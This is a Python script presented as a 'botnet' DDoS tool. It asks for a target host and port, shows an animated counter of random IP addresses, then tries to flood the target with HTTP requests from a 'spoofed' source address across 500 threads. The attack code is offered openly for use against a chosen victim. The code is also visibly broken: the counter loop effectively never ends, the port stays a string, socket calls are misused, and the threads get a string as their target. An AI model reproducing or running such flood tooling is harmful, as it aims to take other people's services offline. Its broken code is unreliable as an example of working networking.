import socket
import threading
import random
import sys
import time

class Colors:
    """ ANSI color codes """
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"

    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32
class botnet:
    def __init__(self):
        self.notice = f"[{Colors.YELLOW}{time.strftime("%Y-%m-%d %H:%M:%S")}{Colors.END}] [{Colors.GREEN}INFO{Colors.END}] "
        self.warning = f"[{Colors.YELLOW}{time.strftime("%Y-%m-%d %H:%M:%S")}{Colors.END}] [{Colors.YELLOW}WARNING{Colors.END}]"
        self.error = f"[{Colors.YELLOW}{time.strftime("%Y-%m-%d %H:%M:%S")}{Colors.END}] [{Colors.RED}ERROR{Colors.END}]"
        self.success_notice = f"{Colors.GREEN}SUCCESS{Colors.END}"
        self.timestamp = f"[{Colors.YELLOW}{time.strftime("%Y-%m-%d %H:%M:%S")}]{Colors.END}"

    def write(self, s):
        for c in s + "\n":
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(0.050)

    def main(self):
        port = input(f"{self.timestamp} [ARMY] A-WEBH/+DDOS | set a port ==> ")
        target = input(f"{self.timestamp} [ARMY] A-WEBH/+DDOS | set a target ==> ")
        self.write(f"{self.notice}TARGET HAS BEEN SET TO {target} ==> {self.success_notice}")
        self.write(f"{self.notice}TIME HTTP FLOOD DEFAULT SET 60 seconds..")
        print(f"{self.notice}ATTACK HAS BEEN STARTED..")
        self.attack(target, port)

    def attack(self, target, port):
        try:
            while True:
                totals = 42000000000000
                for i in range(1, totals + 1):
                    print(f"\r{self.timestamp} [{Colors.RED}ATTACK{Colors.END}] : Total {Colors.GREEN}{i}{Colors.END} (delta {None}), reused {Colors.GREEN}{i}{Colors.END} (delta {None}), pack-IPs {'.'.join([str(random.randint(1, 255)) for _ in range(4)])}", end='')
                    time.sleep(0.1)
                print("\r", end='')
                time.sleep(1)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                spoofed_ip = ('.'.join([str(random.randint(1, 255)) for _ in range(4)]), 0)
                s.bind(spoofed_ip)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                s.connect((target, port))
                s.sendall((f"GET / HTTP/1.1\r\n").encode(), (target, port))
                s.sendall((f"Host: " + '.'.join([str(random.randint(1, 255)) for _ in range(4)]) + "\r\n\r\n").encode(),(target, port))
                s.sendall(('User-Agent: ' + self.generate_random_useragent() + '\r\n\r\n').encode())
                s.close()
                time.sleep(12)
                break

            thread = []
            for _ in range(500):
                thread = threading.Thread(target=target, args=(target, port))
                thread.start()

        except Exception as e:
            print(f"{self.error}: {e}")
        except KeyboardInterrupt as key:
            self.write(f"\n{self.warning} Keyboard Interrupt! Exitting..")
            print(key)
            sys.exit(0)

    def generate_random_useragent(self):
        useragent = "useragent.txt"
        with open(useragent, 'r') as file:
            useragent = file.readlines()
            return random.choice(useragent).strip()

if __name__ == '__main__':
    BotAttack = botnet()
    BotAttack.main()